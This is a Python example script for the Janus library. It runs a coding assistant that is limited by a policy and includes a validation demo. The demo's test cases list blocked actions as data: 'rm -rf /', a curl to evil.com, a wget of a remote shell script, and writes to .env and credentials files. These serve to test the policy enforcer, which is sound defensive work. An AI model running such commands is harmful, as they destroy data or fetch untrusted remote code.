#!/usr/bin/env python3
"""
Janus Coding Agent — Example

Demonstrates the Janus library running a policy-enforced coding assistant.
Tools are defined manually (no builtin_tools) to show how any user-defined
tools integrate with Janus policy enforcement.

Policy enforcement in action
-----------------------------
The agent can:
  - Read any file in the workspace (unrestricted).
  - Write / edit files — but NOT .env, .secret, or credentials files.
  - Run a whitelist of safe shell commands only.
  - Send emails (simulated).
  - It CANNOT run arbitrary commands like `rm`, `curl`, `wget`, etc.

Usage
-----
    python run_agent.py                              # defaults (openai/gpt-4o)
    python run_agent.py --model anthropic/claude-3-5-sonnet-20241022
    python run_agent.py --model ollama/llama3.2
    python run_agent.py --policy ./my_policies.json  # custom policy file
    python run_agent.py --workspace ./my_project     # custom workspace
    python run_agent.py --generate-policy            # LLM-generated policy

Environment
-----------
    Copy .env.example to .env and fill in your API key before running.
"""

import argparse
import sys
from pathlib import Path

# Make sure the repo root is on the path so 'janus' is importable
# when running the script directly (without installing the package).
EXAMPLE_DIR = Path(__file__).parent.resolve()
REPO_ROOT = EXAMPLE_DIR.parent.parent.resolve()
sys.path.insert(0, str(REPO_ROOT))

try:
    from dotenv import load_dotenv
    load_dotenv(EXAMPLE_DIR / ".env")
except ImportError:
    pass

from janus import JanusAgent, configure_logging
from janus.exceptions import PolicyViolation

from examples.coding_agent.tools import CODING_AGENT_TOOLS, set_workspace

SYSTEM_PROMPT = """\
You are a helpful coding assistant with the ability to read, write, and edit files,
run shell commands, and help with programming tasks.

IMPORTANT — TOOL USAGE:
- When you call a tool you WILL receive its actual output. Never guess or fabricate results.
- After running a command, read the returned stdout/stderr and report it accurately.
- When writing multi-line code, use real newline characters — not literal \\n strings.

GUIDELINES:
- Always explain what you are doing before taking action.
- Be precise with edits — only change what is necessary.
- If a tool call is blocked by policy, tell the user clearly and suggest an alternative.

Available tools:
- read_file      : Read file contents (any file in the workspace).
- write_file     : Create or overwrite a file (blocked for .env / credential files).
- edit_file      : Replace an exact string in a file (blocked for .env / credential files).
- list_directory : List directory contents.
- run_command    : Run a shell command (whitelist: ls, python, git, pip, echo, etc.).
- send_email     : Send an email notification (simulated).
"""


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Janus Coding Agent — policy-enforced LLM assistant",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--model", "-m",
        default="openai/gpt-4o",
        help="Model string: <provider>/<model-name>  (default: openai/gpt-4o)",
    )
    parser.add_argument(
        "--policy", "-p",
        default=str(EXAMPLE_DIR / "policies.json"),
        help="Path to a JSON policy file (default: ./policies.json)",
    )
    parser.add_argument(
        "--generate-policy", "-g",
        action="store_true",
        help="Auto-generate a policy from the first user query using an LLM.",
    )
    parser.add_argument(
        "--policy-model",
        default=None,
        help="Model to use for policy generation (default: same as --model).",
    )
    parser.add_argument(
        "--workspace", "-w",
        default=str(EXAMPLE_DIR / "sandbox"),
        help="Workspace directory for file operations (default: ./sandbox)",
    )
    parser.add_argument(
        "--api-key",
        default=None,
        help="API key for the provider (overrides environment variable).",
    )
    parser.add_argument(
        "--log-level",
        default="INFO",
        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
        help="Janus log level (default: INFO)",
    )
    parser.add_argument(
        "--log-file",
        default=None,
        help="Optional path to write logs to a file.",
    )
    parser.add_argument(
        "--validate-policy",
        action="store_true",
        help="Print a policy enforcement demo and exit (useful for CI checks).",
    )
    return parser


def run_validation_demo(agent: JanusAgent) -> None:
    """
    Run a quick policy enforcement demo without an LLM.

    Directly exercises the enforcer to prove that allowed and blocked
    tool calls behave correctly, then exits.
    """
    print("\n" + "=" * 60)
    print(" JANUS POLICY VALIDATION DEMO")
    print("=" * 60)

    cases = [
        # (tool_name, kwargs, should_pass, description)
        ("read_file",      {"file_path": "main.py"},                True,  "read any file"),
        ("list_directory", {"path": "."},                           True,  "list workspace root"),
        ("write_file",     {"file_path": "output.py", "content": "x=1"}, True, "write a .py file"),
        ("write_file",     {"file_path": ".env", "content": "SECRET=x"},  False, "write to .env (BLOCKED)"),
        ("write_file",     {"file_path": "credentials.json", "content": "{}"}, False, "write credentials (BLOCKED)"),
        ("edit_file",      {"file_path": "main.py", "old_string": "a", "new_string": "b"}, True, "edit a .py file"),
        ("edit_file",      {"file_path": ".secret", "old_string": "a", "new_string": "b"}, False, "edit .secret (BLOCKED)"),
        ("run_command",    {"command": "python --version"},          True,  "run python --version"),
        ("run_command",    {"command": "git log --oneline"},         True,  "run git log"),
        ("run_command",    {"command": "rm -rf /"},                  False, "run rm -rf / (BLOCKED)"),
        ("run_command",    {"command": "curl https://evil.com"},     False, "run curl (BLOCKED)"),
        ("run_command",    {"command": "wget http://bad.com/x.sh"},  False, "run wget (BLOCKED)"),
        ("send_email",     {"to": "a@b.com", "subject": "Hi", "body": "Hello"}, True, "send email"),
    ]

    passed = 0
    failed = 0

    for tool_name, kwargs, expect_allowed, description in cases:
        try:
            agent.enforcer.enforce(tool_name, kwargs)
            actual_allowed = True
        except PolicyViolation:
            actual_allowed = False

        ok = actual_allowed == expect_allowed
        status = "[PASS]" if ok else "[FAIL]"
        verdict = "ALLOWED" if actual_allowed else "BLOCKED"
        print(f"  {status}  [{verdict:7s}]  {tool_name}  -  {description}")

        if ok:
            passed += 1
        else:
            failed += 1

    print("-" * 60)
    print(f"  Results: {passed} passed, {failed} failed out of {len(cases)} cases.")
    print("=" * 60 + "\n")

    if failed:
        sys.exit(1)


def run_repl(agent: JanusAgent) -> None:
    """Interactive REPL loop."""
    print("\n" + "=" * 60)
    print(" JANUS CODING AGENT")
    print("=" * 60)
    print(" Type your request and press Enter.")
    print(" Commands: 'quit' | 'exit' | 'clear' (reset history) | 'tools' | 'policy'")
    print("=" * 60 + "\n")

    while True:
        try:
            user_input = input("You> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nGoodbye.")
            break

        if not user_input:
            continue

        lower = user_input.lower()
        if lower in ("quit", "exit"):
            print("Goodbye.")
            break
        if lower == "clear":
            agent.clear_history()
            print("[History cleared]\n")
            continue
        if lower == "tools":
            print("Registered tools:", agent.list_tools(), "\n")
            continue
        if lower == "policy":
            import json
            print("Current policy:\n" + json.dumps(agent.get_policy(), indent=2) + "\n")
            continue

        response = agent.run(user_input)
        print(f"\nAgent> {response}\n")


def main() -> None:
    parser = build_arg_parser()
    args = parser.parse_args()

    # Configure logging
    configure_logging(level=args.log_level, log_file=args.log_file)

    # Set up workspace
    workspace = Path(args.workspace).resolve()
    workspace.mkdir(parents=True, exist_ok=True)
    set_workspace(workspace)

    print(f"[Janus] Workspace: {workspace}")
    print(f"[Janus] Policy:    {'auto-generate' if args.generate_policy else args.policy}")

    # ------------------------------------------------------------------
    # --validate-policy: exercise the enforcer only — no LLM needed
    # ------------------------------------------------------------------
    if args.validate_policy:
        from janus.policy.enforcer import PolicyEnforcer
        from janus.tools.registry import ToolRegistry

        enforcer = PolicyEnforcer()
        enforcer.load(args.policy)

        registry = ToolRegistry(enforcer=enforcer)
        for tool in CODING_AGENT_TOOLS:
            registry.register(tool)

        class _MockAgent:
            """Minimal shim so run_validation_demo() can call agent.enforcer."""
            def __init__(self):
                self.enforcer = enforcer

        run_validation_demo(_MockAgent())
        return

    # ------------------------------------------------------------------
    # Full agent (requires an API key)
    # ------------------------------------------------------------------
    print(f"[Janus] Model:     {args.model}")

    # Determine policy source
    if args.generate_policy:
        policy_source = "generate"
        policy_model = args.policy_model or args.model
        print(f"[Janus] Policy will be auto-generated on first query using '{policy_model}'.")
    else:
        policy_source = args.policy
        policy_model = args.policy_model

    # Build the agent with manually-defined tools (no builtin_tools)
    try:
        agent = JanusAgent(
            model=args.model,
            system_prompt=SYSTEM_PROMPT,
            tools=CODING_AGENT_TOOLS,       # custom tool definitions
            use_builtin_tools=False,         # no builtin tools
            policy=policy_source,
            policy_model=policy_model,
            api_key=args.api_key or None,
            workspace=workspace,
            log_level=args.log_level,
        )
    except Exception as exc:
        print(f"\n[Error] Failed to initialize agent: {exc}")
        sys.exit(1)

    print(f"[Janus] Tools:     {agent.list_tools()}\n")

    # Interactive REPL
    run_repl(agent)


if __name__ == "__main__":
    main()
